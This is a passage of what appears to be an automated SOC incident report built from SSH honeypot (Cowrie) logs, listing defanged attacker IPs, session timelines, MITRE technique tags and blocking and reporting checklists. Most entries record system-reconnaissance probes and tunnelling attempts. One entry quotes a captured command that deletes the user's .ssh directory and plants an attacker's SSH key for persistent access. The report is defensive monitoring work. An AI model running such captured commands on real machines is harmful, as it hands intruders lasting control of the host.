- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3485c60900c4

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 01:11 |
| **Last Seen** | 2026-08-17 01:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:11:05` | `cowrie.session.connect` |
| `2026-08-17 01:11:05` | `cowrie.client.version` |
| `2026-08-17 01:11:05` | `cowrie.client.kex` |
| `2026-08-17 01:11:06` | `cowrie.login.success` |
| `2026-08-17 01:11:07` | `cowrie.session.params` |
| `2026-08-17 01:11:07` | `cowrie.command.input` |
| `2026-08-17 01:11:07` | `cowrie.log.closed` |
| `2026-08-17 01:11:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-add931bbf239

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-17 01:11 |
| **Last Seen** | 2026-08-17 01:12 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:11:30` | `cowrie.session.connect` |
| `2026-08-17 01:11:36` | `cowrie.client.version` |
| `2026-08-17 01:11:36` | `cowrie.client.kex` |
| `2026-08-17 01:12:02` | `cowrie.login.success` |
| `2026-08-17 01:12:14` | `cowrie.session.params` |
| `2026-08-17 01:12:14` | `cowrie.command.input` |
| `2026-08-17 01:12:21` | `cowrie.log.closed` |
| `2026-08-17 01:12:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4109bf016a4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-17 01:11 |
| **Last Seen** | 2026-08-17 01:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:11:52` | `cowrie.session.connect` |
| `2026-08-17 01:11:53` | `cowrie.client.version` |
| `2026-08-17 01:11:53` | `cowrie.client.kex` |
| `2026-08-17 01:11:56` | `cowrie.login.success` |
| `2026-08-17 01:11:58` | `cowrie.session.params` |
| `2026-08-17 01:11:58` | `cowrie.command.input` |
| `2026-08-17 01:11:58` | `cowrie.command.input` |
| `2026-08-17 01:11:58` | `cowrie.command.input` |
| `2026-08-17 01:11:58` | `cowrie.command.input` |
| `2026-08-17 01:11:58` | `cowrie.command.input` |
| `2026-08-17 01:11:58` | `cowrie.command.success` |
| `2026-08-17 01:11:58` | `cowrie.command.input` |
| `2026-08-17 01:11:58` | `cowrie.command.input` |
| `2026-08-17 01:11:58` | `cowrie.command.input` |
| `2026-08-17 01:11:58` | `cowrie.command.input` |
| `2026-08-17 01:11:59` | `cowrie.log.closed` |
| `2026-08-17 01:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c4c8325aebf

| Field | Detail |
|---|---|
| **Source IP** | `31.41.81[.]65` |
| **First Seen** | 2026-08-17 01:12 |
| **Last Seen** | 2026-08-17 01:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:12:36` | `cowrie.session.connect` |
| `2026-08-17 01:12:36` | `cowrie.client.version` |
| `2026-08-17 01:12:36` | `cowrie.client.kex` |
| `2026-08-17 01:12:37` | `cowrie.login.success` |
| `2026-08-17 01:12:37` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:12:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.41.81[.]65` to AbuseIPDB if not already reported
- [ ] Block `31.41.81[.]65` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-529653634205

| Field | Detail |
|---|---|
| **Source IP** | `220.161.52[.]149` |
| **First Seen** | 2026-08-17 01:12 |
| **Last Seen** | 2026-08-17 01:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:12:42` | `cowrie.session.connect` |
| `2026-08-17 01:12:43` | `cowrie.client.version` |
| `2026-08-17 01:12:43` | `cowrie.client.kex` |
| `2026-08-17 01:12:45` | `cowrie.login.success` |
| `2026-08-17 01:12:46` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.161.52[.]149` to AbuseIPDB if not already reported
- [ ] Block `220.161.52[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58c9a9098512

| Field | Detail |
|---|---|
| **Source IP** | `4.246.117[.]137` |
| **First Seen** | 2026-08-17 01:12 |
| **Last Seen** | 2026-08-17 01:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:12:50` | `cowrie.session.connect` |
| `2026-08-17 01:12:50` | `cowrie.client.version` |
| `2026-08-17 01:12:51` | `cowrie.client.kex` |
| `2026-08-17 01:12:51` | `cowrie.login.success` |
| `2026-08-17 01:12:52` | `cowrie.session.params` |
| `2026-08-17 01:12:52` | `cowrie.command.input` |
| `2026-08-17 01:12:52` | `cowrie.command.failed` |
| `2026-08-17 01:12:52` | `cowrie.log.closed` |
| `2026-08-17 01:12:53` | `cowrie.session.params` |
| `2026-08-17 01:12:53` | `cowrie.command.input` |
| `2026-08-17 01:12:53` | `cowrie.session.file_download` |
| `2026-08-17 01:12:53` | `cowrie.log.closed` |
| `2026-08-17 01:12:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.246.117[.]137` to AbuseIPDB if not already reported
- [ ] Block `4.246.117[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8653c386f0b4

| Field | Detail |
|---|---|
| **Source IP** | `4.246.117[.]137` |
| **First Seen** | 2026-08-17 01:12 |
| **Last Seen** | 2026-08-17 01:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:12:53` | `cowrie.session.connect` |
| `2026-08-17 01:12:53` | `cowrie.client.version` |
| `2026-08-17 01:12:53` | `cowrie.client.kex` |
| `2026-08-17 01:12:53` | `cowrie.login.success` |
| `2026-08-17 01:12:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.246.117[.]137` to AbuseIPDB if not already reported
- [ ] Block `4.246.117[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3feb4299a47

| Field | Detail |
|---|---|
| **Source IP** | `4.246.117[.]137` |
| **First Seen** | 2026-08-17 01:12 |
| **Last Seen** | 2026-08-17 01:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:12:53` | `cowrie.session.connect` |
| `2026-08-17 01:12:53` | `cowrie.client.version` |
| `2026-08-17 01:12:53` | `cowrie.client.kex` |
| `2026-08-17 01:12:54` | `cowrie.login.success` |
| `2026-08-17 01:12:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.246.117[.]137` to AbuseIPDB if not already reported
- [ ] Block `4.246.117[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-595cd5d96bb0

| Field | Detail |
|---|---|
| **Source IP** | `116.59.10[.]205` |
| **First Seen** | 2026-08-17 01:16 |
| **Last Seen** | 2026-08-17 01:16 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:16:31` | `cowrie.session.connect` |
| `2026-08-17 01:16:33` | `cowrie.client.version` |
| `2026-08-17 01:16:33` | `cowrie.client.kex` |
| `2026-08-17 01:16:37` | `cowrie.login.success` |
| `2026-08-17 01:16:38` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:16:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.59.10[.]205` to AbuseIPDB if not already reported
- [ ] Block `116.59.10[.]205` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef4b625d85a0

| Field | Detail |
|---|---|
| **Source IP** | `36.137.38[.]119` |
| **First Seen** | 2026-08-17 01:16 |
| **Last Seen** | 2026-08-17 01:16 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:16:44` | `cowrie.session.connect` |
| `2026-08-17 01:16:46` | `cowrie.client.version` |
| `2026-08-17 01:16:46` | `cowrie.client.kex` |
| `2026-08-17 01:16:49` | `cowrie.login.success` |
| `2026-08-17 01:16:50` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.137.38[.]119` to AbuseIPDB if not already reported
- [ ] Block `36.137.38[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-458416aa7d47

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-17 01:17 |
| **Last Seen** | 2026-08-17 01:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:17:02` | `cowrie.session.connect` |
| `2026-08-17 01:17:03` | `cowrie.client.version` |
| `2026-08-17 01:17:03` | `cowrie.client.kex` |
| `2026-08-17 01:17:06` | `cowrie.login.success` |
| `2026-08-17 01:17:09` | `cowrie.session.params` |
| `2026-08-17 01:17:09` | `cowrie.command.input` |
| `2026-08-17 01:17:09` | `cowrie.command.input` |
| `2026-08-17 01:17:09` | `cowrie.command.input` |
| `2026-08-17 01:17:09` | `cowrie.command.input` |
| `2026-08-17 01:17:09` | `cowrie.command.input` |
| `2026-08-17 01:17:09` | `cowrie.command.success` |
| `2026-08-17 01:17:09` | `cowrie.command.input` |
| `2026-08-17 01:17:09` | `cowrie.command.input` |
| `2026-08-17 01:17:09` | `cowrie.command.input` |
| `2026-08-17 01:17:09` | `cowrie.command.input` |
| `2026-08-17 01:17:10` | `cowrie.log.closed` |
| `2026-08-17 01:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33d6643252fa

| Field | Detail |
|---|---|
| **Source IP** | `192.72.56[.]178` |
| **First Seen** | 2026-08-17 01:17 |
| **Last Seen** | 2026-08-17 01:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:17:37` | `cowrie.session.connect` |
| `2026-08-17 01:17:38` | `cowrie.client.version` |
| `2026-08-17 01:17:38` | `cowrie.client.kex` |
| `2026-08-17 01:17:40` | `cowrie.login.success` |
| `2026-08-17 01:17:41` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:17:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.72.56[.]178` to AbuseIPDB if not already reported
- [ ] Block `192.72.56[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a58408d0da19

| Field | Detail |
|---|---|
| **Source IP** | `67.85.146[.]216` |
| **First Seen** | 2026-08-17 01:18 |
| **Last Seen** | 2026-08-17 01:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:18:57` | `cowrie.session.connect` |
| `2026-08-17 01:18:57` | `cowrie.client.version` |
| `2026-08-17 01:18:57` | `cowrie.client.kex` |
| `2026-08-17 01:18:59` | `cowrie.login.success` |
| `2026-08-17 01:18:59` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:19:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `67.85.146[.]216` to AbuseIPDB if not already reported
- [ ] Block `67.85.146[.]216` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-367b8db2e905

| Field | Detail |
|---|---|
| **Source IP** | `182.53.52[.]68` |
| **First Seen** | 2026-08-17 01:19 |
| **Last Seen** | 2026-08-17 01:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:19:05` | `cowrie.session.connect` |
| `2026-08-17 01:19:06` | `cowrie.client.version` |
| `2026-08-17 01:19:06` | `cowrie.client.kex` |
| `2026-08-17 01:19:09` | `cowrie.login.success` |
| `2026-08-17 01:19:09` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:19:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.53.52[.]68` to AbuseIPDB if not already reported
- [ ] Block `182.53.52[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8143f538ff04

| Field | Detail |
|---|---|
| **Source IP** | `103.174.145[.]35` |
| **First Seen** | 2026-08-17 01:19 |
| **Last Seen** | 2026-08-17 01:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:19:10` | `cowrie.session.connect` |
| `2026-08-17 01:19:10` | `cowrie.client.version` |
| `2026-08-17 01:19:10` | `cowrie.client.kex` |
| `2026-08-17 01:19:12` | `cowrie.login.success` |
| `2026-08-17 01:19:13` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:19:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.145[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.174.145[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78297783f868

| Field | Detail |
|---|---|
| **Source IP** | `1.247.245[.]61` |
| **First Seen** | 2026-08-17 01:19 |
| **Last Seen** | 2026-08-17 01:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:19:18` | `cowrie.session.connect` |
| `2026-08-17 01:19:18` | `cowrie.client.version` |
| `2026-08-17 01:19:18` | `cowrie.client.kex` |
| `2026-08-17 01:19:21` | `cowrie.login.success` |
| `2026-08-17 01:19:22` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:19:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.247.245[.]61` to AbuseIPDB if not already reported
- [ ] Block `1.247.245[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc1ba6aea0b1

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-17 01:19 |
| **Last Seen** | 2026-08-17 01:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:19:23` | `cowrie.session.connect` |
| `2026-08-17 01:19:23` | `cowrie.client.version` |
| `2026-08-17 01:19:23` | `cowrie.client.kex` |
| `2026-08-17 01:19:24` | `cowrie.login.success` |
| `2026-08-17 01:19:24` | `cowrie.direct-tcpip.request` |
| `2026-08-17 01:19:24` | `cowrie.direct-tcpip.data` |
| `2026-08-17 01:19:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28bb096b80db

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-17 01:19 |
| **Last Seen** | 2026-08-17 01:20 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:19:50` | `cowrie.session.connect` |
| `2026-08-17 01:19:50` | `cowrie.client.version` |
| `2026-08-17 01:19:50` | `cowrie.client.kex` |
| `2026-08-17 01:19:53` | `cowrie.login.success` |
| `2026-08-17 01:20:04` | `cowrie.session.params` |
| `2026-08-17 01:20:04` | `cowrie.command.input` |
| `2026-08-17 01:20:04` | `cowrie.command.input` |
| `2026-08-17 01:20:04` | `cowrie.command.input` |
| `2026-08-17 01:20:04` | `cowrie.command.input` |
| `2026-08-17 01:20:04` | `cowrie.command.input` |
| `2026-08-17 01:20:04` | `cowrie.command.success` |
| `2026-08-17 01:20:04` | `cowrie.command.input` |
| `2026-08-17 01:20:04` | `cowrie.command.input` |
| `2026-08-17 01:20:04` | `cowrie.command.input` |
| `2026-08-17 01:20:04` | `cowrie.command.input` |
| `2026-08-17 01:20:05` | `cowrie.log.closed` |
| `2026-08-17 01:20:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cbe0681827b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-17 01:22 |
| **Last Seen** | 2026-08-17 01:22 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:22:31` | `cowrie.session.connect` |
| `2026-08-17 01:22:32` | `cowrie.client.version` |
| `2026-08-17 01:22:32` | `cowrie.client.kex` |
| `2026-08-17 01:22:38` | `cowrie.login.success` |
| `2026-08-17 01:22:41` | `cowrie.session.params` |
| `2026-08-17 01:22:41` | `cowrie.command.input` |
| `2026-08-17 01:22:41` | `cowrie.command.input` |
| `2026-08-17 01:22:41` | `cowrie.command.input` |
| `2026-08-17 01:22:41` | `cowrie.command.input` |
| `2026-08-17 01:22:41` | `cowrie.command.input` |
| `2026-08-17 01:22:41` | `cowrie.command.success` |
| `2026-08-17 01:22:41` | `cowrie.command.input` |
| `2026-08-17 01:22:41` | `cowrie.command.input` |
| `2026-08-17 01:22:41` | `cowrie.command.input` |
| `2026-08-17 01:22:41` | `cowrie.command.input` |
| `2026-08-17 01:22:43` | `cowrie.log.closed` |
| `2026-08-17 01:22:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fb02bd481c7

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-17 01:25 |
| **Last Seen** | 2026-08-17 01:25 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 01:25:00` | `cowrie.session.connect` |
